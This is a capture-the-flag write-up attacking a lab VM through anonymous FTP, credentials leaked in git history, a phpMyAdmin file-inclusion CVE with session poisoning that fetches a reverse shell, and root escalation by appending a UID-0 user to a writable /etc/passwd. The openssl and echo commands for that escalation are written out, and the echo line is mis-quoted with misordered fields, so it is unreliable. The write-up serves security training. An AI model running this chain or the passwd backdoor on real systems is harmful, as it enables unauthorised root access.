# Sector443 Aaruush Pwn CTF

## The setup
A pretty straightforward setup of two VMs — the challenge machine and Kali, the latter accessed via SSH.

![setup](/home/icy/Pictures/writeup/setup.png)

## Enumeration

Opening up the machine IP in a browser gives us a simple landing page of what looks like our uni's techfest :)  
Nothing of much importance here. Let's launch our preliminary scans, `dirb` and `nmap`. Here's the `nmap` output.

```
PORT    STATE  SERVICE VERSION
21/tcp  open   ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0        341063997 Aug 07 01:40 aaruush-website.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp  open   ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 da:06:7b:c8:5d:a4:dd:39:d5:ee:db:67:d8:e3:a2:f9 (DSA)
|   2048 23:67:fc:c7:d1:49:f1:58:50:2c:33:bc:e9:80:0e:d9 (RSA)
|   256 cf:05:c8:39:97:00:ef:c4:d2:a8:16:62:03:30:f9:3d (ECDSA)
|_  256 80:d9:90:f7:64:24:76:0e:83:e8:08:dc:ea:fb:2f:83 (ED25519)
80/tcp  open   http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Coming Soon | Aaruush
443/tcp closed https
MAC Address: 08:00:27:E3:A5:AC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Hmm, it appears that there's an open FTP server running, allowing anonymous login. It also appears to be serving a file. Let's fetch that, shall we? 

```
root@kali:~# ftp 192.168.56.102
Connected to 192.168.56.102.
220 (vsFTPd 3.0.2)
Name (192.168.56.102:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0        341063997 Aug 07 01:40 aaruush-website.zip
226 Directory send OK.
ftp> get aaruush-website.zip
local: aaruush-website.zip remote: aaruush-website.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aaruush-website.zip (341063997 bytes).
226 Transfer complete.
341063997 bytes received in 1.65 secs (197.7089 MB/s)
ftp> 221 Goodbye.
```

Unzipping the file gives us a Git repository. Looking through the files, you see a few files with the MySQL auth info redacted, like this one here.

![redacted](/home/icy/Pictures/writeup/redactedcreds.png)

But where are the creds? They _were_ there at some point. Taking a peek at the `git log` reveals just that. 

![gitlog](/home/icy/Pictures/writeup/gitlog.png)

Brilliant, so doing a `git diff 4935be9` (the commit before the creds were removed) gives us our MySQL login credentials.

![creds](/home/icy/Pictures/writeup/creds.png)

The `dirb` scan we had run earlier shows us the existence of phpMyAdmin. Trying out our newfound credentials logs us in right away.

![pma](/home/icy/Pictures/writeup/pma.png)

Enumerating further, we find that the version of PMA running on this machine has a recent CVE for it. Here's the CVE description:

>An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for whitelisted pages. An attacker must be authenticated, except in the "$cfg['AllowArbitraryServer'] = true" case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the "$cfg['ServerDefault'] = 0" case (which bypasses the login requirement and runs the vulnerable code without any authentication). 

In short, we have LFI or Local File Inclusion. But that's not of much use on its own. Our goal is to achieve code execution and pop a shell. Reading up a bit on LFI to RCE (especially for this specific exploit), sheds light on the possibility of session poisoning. 

## Exploitation

First off, let's test our LFI. 

![lfitest](/home/icy/Pictures/writeup/lfitest.png)

This exploit is a multi-step procedure. Here's a quick outline:
1. Inject our code into the session file
2. Load it via file inclusion
3. Execute it and listen for a shell

### Step 1 — Injecting our code
To do this, we run a `SELECT` query in the PMA console, like so.

![select](/home/icy/Pictures/writeup/select.png)

We're performing a simple `wget` to fetch our reverse shell. 
This now resides in the session file, which means loading up the session file should execute this code. 

### Step 2 — Loading our code via file inclusion

To load our session file, we need our session ID. This can be found under the 'Storage' tab in Firefox's devtools. 

![sessionid](/home/icy/Pictures/writeup/sessionid.png)

The session file itself is stored at `/var/lib/php5/sess_<id>`. Loading this path via LFI executes our `wget`. Our reverse shell now resides on the filesystem.

### Step 3 — Executing our payload

Our shell got downloaded into the website's root. If you're unsure of where that might be, you can always check using the `phpinfo()` function in place of `system()`, in step 1.

In our case, it is `/var/www/html`. Prep the listener and navigate to the shell's location. 

Voilà! We have our shell, albeit a bit unprivileged. 

![shell](/home/icy/Pictures/writeup/shell.png)

## Privilege escalation

Poking around through the filesystem, one might notice that the `/etc/passwd` file actually has global-write permissions. This means we can add our own user with root privs on the system. 

The general format for an entry in the `passwd` file is like this:

`<username>:<salted password>:<userid>:<groupid>:<gecos>:<home dir>:<shell>`

This is typically generated and appended by the `passwd` / `adduser` commands. Since we can't run them due to lack of privileges, we will have to do it manually. 

The salted password can be generated using `openssl`, like so:
```
$ openssl passwd -1 -salt gaben hunter2
$1$gaben$Wh5akJgd9Y5VfGURWiXE1.        # our salt
```

`echo`ing this into our `passwd` file adds our new (super)user.

```
$ echo "gaben:$1$gaben$Wh5akJgd9Y5VfGURWiXE1.:0:0:/root/root:/bin/bash >> /etc/passwd"
```

Finally, `su` into our user and grab the flag. 

![root](/home/icy/Pictures/writeup/root.png) 



